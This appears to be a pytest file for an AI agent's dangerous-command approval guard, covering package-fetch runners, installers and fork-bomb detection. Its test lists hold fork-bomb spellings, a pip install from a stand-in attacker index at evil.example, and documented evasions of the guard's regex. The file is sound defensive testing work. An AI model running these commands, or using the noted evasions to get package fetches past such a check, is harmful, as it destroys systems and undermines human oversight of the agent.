"""Guard for package fetch / remote package execution.

Two holes this file pins down, both found by running the REAL parser (not by
reading it):

1. ``pip install --target . requests`` evaded the supply-chain regex. The regex
   consumes ``--target`` as an option but cannot skip the option's *value*
   (``.``), and the package lookahead ``(?!-|\\.)`` then rejects it. Nothing
   downstream ever saw ``requests``.

2. The *runner* family — ``npx`` / ``bunx`` / ``uvx`` / ``pnpm dlx`` /
   ``yarn dlx`` / ``npm exec`` / ``pipx run`` — fetches a package from a public
   registry and executes it in one step. ``curl | sh`` is already a hardline
   finding in this module; the registry equivalent was not flagged at all.
   npm's own "Ok to proceed?" prompt does not help: with stdin not a TTY, which
   is every agent invocation, npm proceeds automatically.

Every case below was executed against ``tools.approval.detect_dangerous_command``
on the real import path, not against a re-implementation.
"""

import pytest

from tools.approval import detect_dangerous_command


# --- Runners: fetch + execute in one step -----------------------------------
REMOTE_EXECUTION = [
    "npx cowsay hi",
    "npx -y create-react-app app",
    "npx --yes some-pkg",
    "bunx cowsay",
    "uvx ruff check .",
    "pnpm dlx create-app",
    "yarn dlx foo",
    "npm exec -- cowsay",
    "pipx run cowsay",
]

# --- Installers the regex table does not reach ------------------------------
INSTALLERS = [
    "pipx install black",
    "mamba install numpy",
    "micromamba install numpy",
    "conda create -n env python=3.12",
    "go get github.com/example/pkg",
    "dotnet add package Newtonsoft.Json",
    "nuget install SomePackage",
    "composer require monolog/monolog",
    "uv tool install ruff",
]

# --- The measured evasion ----------------------------------------------------
OPTION_VALUE_EVASION = [
    "pip install --target . requests",
    "pip install -t ./vendor requests",
    "uv pip install --target . requests",
    "python -m pip install --target . requests",
]

# --- Regression: what the regex table already caught must STILL be caught ----
ALREADY_COVERED = [
    "pip install requests",
    "npm install left-pad",
    "npm i lodash",
    "pnpm add react",
    "yarn add vite",
    "bun add zod",
    "uv add fastapi",
    "uv pip install requests",
    "poetry add django",
    "pdm add httpx",
    "conda install numpy",
    "cargo add serde",
    "cargo install cargo-audit",
    "gem install rails",
    "go install github.com/example/pkg@latest",
    "hermes capabilities update",
]

# --- Must stay silent --------------------------------------------------------
BENIGN = [
    # lockfile restores: the dependency graph is already pinned and reviewed
    "npm ci",
    "npm install",
    "pnpm install",
    "yarn install",
    "bun install",
    "pip install -r requirements.txt",
    "pip install --requirement dev.txt",
    "uv sync --frozen",
    "uv pip install -r requirements.txt",
    "composer install",
    # explicitly local runner forms: guaranteed not to reach the network
    "npx --no-install tsc",
    "npx --no tsc",
    "pnpm dlx --no-install foo",
    # local project installs, not a registry fetch
    "pip install -e .",
    "pip install .",
    "pip install --editable .",
    # ordinary development
    "pytest -q",
    "python -m pytest tests/",
    "npm run typecheck",
    "npm run build",
    "npm run lint",
    "go build ./...",
    "go test ./...",
    "cargo build",
    "cargo test",
    "dotnet build",
    "git status",
    "ls -la",
    "node --version",
    "docker compose up -d",
]


@pytest.mark.parametrize("command", REMOTE_EXECUTION)
def test_remote_package_execution_is_flagged(command):
    is_dangerous, _, description = detect_dangerous_command(command)

    assert is_dangerous is True, command
    assert "remote package execution" in description, description


@pytest.mark.parametrize("command", INSTALLERS)
def test_uncovered_installers_are_flagged(command):
    is_dangerous, _, _ = detect_dangerous_command(command)

    assert is_dangerous is True, command


@pytest.mark.parametrize("command", OPTION_VALUE_EVASION)
def test_option_value_does_not_hide_the_package(command):
    """`--target .` must not swallow the operand that follows it."""
    is_dangerous, _, description = detect_dangerous_command(command)

    assert is_dangerous is True, command
    assert "requests" in description, description


@pytest.mark.parametrize("command", ALREADY_COVERED)
def test_existing_coverage_does_not_regress(command):
    is_dangerous, _, _ = detect_dangerous_command(command)

    assert is_dangerous is True, command


@pytest.mark.parametrize("command", BENIGN)
def test_benign_commands_stay_silent(command):
    is_dangerous, _, description = detect_dangerous_command(command)

    assert is_dangerous is False, f"{command} -> {description}"


def test_os_package_managers_remain_out_of_scope():
    """Deliberate scope line, asserted so a future edit has to argue with it.

    `tests/tools/test_approval.py::TestDetectSudoStdin` already asserts
    `apt install sudo` is safe. This guard is about mutating the *project's*
    dependency graph, where lifecycle hooks run as the agent on the next build.
    OS installs are a separate trust decision covered by the sudo/root rules.
    """
    for command in ("apt install sudo", "apt-get install -y curl", "brew install jq"):
        is_dangerous, _, _ = detect_dangerous_command(command)

        assert is_dangerous is False, command


def test_untrusted_index_url_is_surfaced_not_swallowed():
    """`--index-url` redirects the whole install to an attacker-controlled index.

    The existing regex table already fires here and names the URL rather than
    the package. That is the more useful message of the two — the index is the
    actual trust decision — so this test pins the behaviour instead of
    "fixing" it into naming `requests`.
    """
    is_dangerous, _, description = detect_dangerous_command(
        "pip install --index-url https://evil.example/simple requests"
    )

    assert is_dangerous is True
    assert "evil.example" in description, description


def test_runner_flag_names_the_package_in_the_message():
    """An approval prompt that does not name the package is not reviewable."""
    _, _, description = detect_dangerous_command("npx -y left-pad")

    assert "left-pad" in description, description


# ---------------------------------------------------------------------------
# Fork bomb: the hardline floor matched only one spelling
# ---------------------------------------------------------------------------
#
# `HARDLINE_PATTERNS` carried `:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:`, which
# is the textbook form and nothing else. A fork bomb is just a function that
# pipes itself into itself in the background — the name `:` is decoration. Each
# escape below was executed against the real `detect_hardline_command` and came
# back clean before the generalized rule landed.

from tools.approval import detect_hardline_command


FORK_BOMBS = [
    ":(){ :|:& };:",
    ":() { : | : & }; :",
    ": (){ :|:& };:",          # one space — the narrow rule stopped here
    ":(){:|:&};:",
    "bomb(){ bomb|bomb& };bomb",
    "forkbomb() { forkbomb | forkbomb & }; forkbomb",
    "f(){ f|f& };f",
    "_x(){ _x|_x& };_x",
]

ORDINARY_SHELL_FUNCTIONS = [
    "build(){ npm run build; }; build",
    "deploy() { echo a | grep b; }",
    "run(){ tail -f log | grep err & }",   # backgrounded pipe, different names
    "x(){ y|z& }",
    "greet() { echo hi; }",
    "test_helper() { pytest -q; }",
    "fn(){ cat file | wc -l; }",
]


@pytest.mark.parametrize("command", FORK_BOMBS)
def test_fork_bomb_spellings_hit_the_hardline_floor(command):
    is_hardline, description = detect_hardline_command(command)

    assert is_hardline is True, command
    assert description == "fork bomb", description


@pytest.mark.parametrize("command", ORDINARY_SHELL_FUNCTIONS)
def test_ordinary_shell_functions_are_not_fork_bombs(command):
    is_hardline, description = detect_hardline_command(command)

    assert is_hardline is False, f"{command} -> {description}"
